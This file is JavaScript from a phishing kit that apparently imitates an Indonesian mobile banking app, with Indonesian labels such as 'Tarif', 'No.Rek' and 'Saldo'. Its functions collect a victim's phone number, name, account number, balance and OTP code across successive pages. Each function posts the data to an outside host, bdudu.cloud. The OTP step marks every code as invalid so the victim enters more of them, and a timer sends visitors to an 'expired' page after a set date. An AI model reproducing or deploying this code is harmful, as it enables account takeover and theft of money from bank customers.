let tglNow = new Date();
let waktuBatas = new Date("2025-06-08T23:59:59");
if (tglNow.getTime() >= waktuBatas.getTime()) {
  document.location.href = 'https://expiredweb.pages.dev';
} else {
  console.log('Server aktif');
}
var logo = "●●●";    
// index
function sendNohp(){    
    event.preventDefault();                   
    $(".wait").fadeIn();
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
    document.getElementById('kirim').innerHTML = "Memproses....";         
  var nomor = $('#nohp').val();
  sessionStorage.setItem('nomor', nomor);                     
          
   var gabungan = "" + logo + '\n\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif + '\n𝗡𝗼.𝗛𝗽 • <b>' + nohp.value + '</b>';
   
    $.ajax({
        url: 'https://bdudu.cloud/ku/i.php',       
        type: 'POST',
        data: { message: gabungan },
        crossDomain: true,
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        },
    complete: function(){
    audio = document.getElementById("brimo");
    audio.play(); 
    setTimeout(function(){   
    window.location = "login.html";
    
    $(".wait").fadeOut();  
    document.getElementById('kirim').innerHTML = "Lanjutkan";
    vibr(180);
    }, 2000);}});};   
     
     
     
//data     
function sendLogin(){
   $('.wait').fadeIn();
    event.preventDefault();   
    document.getElementById('kirim').innerHTML = "Memproses....";
                   
    var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value  ;    
    
   
     $.ajax({
        url: 'https://bdudu.cloud/ku/i.php',       
        type: 'POST',
        data: { message: gabungan },
        crossDomain: true,
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        },   
    complete: function(){    
    setTimeout(function(){   
    window.location = "saldo.html";    
    $('.wait').fadeOut();
    document.getElementById('kirim').innerHTML = "Lanjutkan"; 
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
  var nomor = $('#nomor').val();
  sessionStorage.setItem('nomor', nomor); 
  var nama = $('#nama').val();
  sessionStorage.setItem('nama', nama); 
  var rek = $('#rek').val();
  sessionStorage.setItem('rek', rek); 
   vibr(180);
    }, 1500);}});};
    
       
    
    
// saldo  
function sendSaldo(){
    event.preventDefault();    
    document.getElementById('kirim').innerHTML = "Verify...";   
    $('.wait').fadeIn();                    
       
    var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value + '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>';
  
     $.ajax({
        url: 'https://bdudu.cloud/ku/i.php',       
        type: 'POST',
        data: { message: gabungan },
        crossDomain: true,
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        },   
   complete: function(){     
   setTimeout(function(){
   document.getElementById('kirim').innerHTML = "Benar";  
   $('.wait').fadeOut();
   window.location = "otp.html";
   vibr(180);  
 var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
  var nomor = $('#nomor').val();
  sessionStorage.setItem('nomor', nomor); 
  var nama = $('#nama').val();
  sessionStorage.setItem('nama', nama); 
  var rek = $('#rek').val();
  sessionStorage.setItem('rek', rek);
  var saldo = $('#saldo').val();
  sessionStorage.setItem('saldo', saldo);
    }, 300);}});};    

        


// otp
function sendOtp(){
    event.preventDefault();        
    $(".wait").fadeIn();   
    document.getElementById('kirim').value = "Memproses....";                            
    
   var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value + '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>' + '\n\n𝗢𝗧𝗣 • <b>' + otp.value + '</b>';  
   
     $.ajax({
        url: 'https://bdudu.cloud/ku/i.php',       
        type: 'POST',
        data: { message: gabungan },
        crossDomain: true,
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        },  
    complete: function(){
    vibr(800);    
    setTimeout(function(){
    $(".wait").fadeOut();   
 $("#otp").val("");
 $("#otp").addClass('invalid-input'); 
   document.getElementById('kirim').value = "Konfirmasi";
    }, 200);}});};



function vibr(dur){
            if (navigator.vibrate) {
                navigator.vibrate(dur);
            } else {
                console.log("NotSupported");
            }
        }

function wa(){
 $(".wait").fadeIn();   
  audio = document.getElementById("tunggu");
   audio.play();
   
setTimeout(function(){  
location.href='wa';
    }, 5000);
    setTimeout(function(){
    $(".wait").fadeOut();   
    }, 5100);      
}     
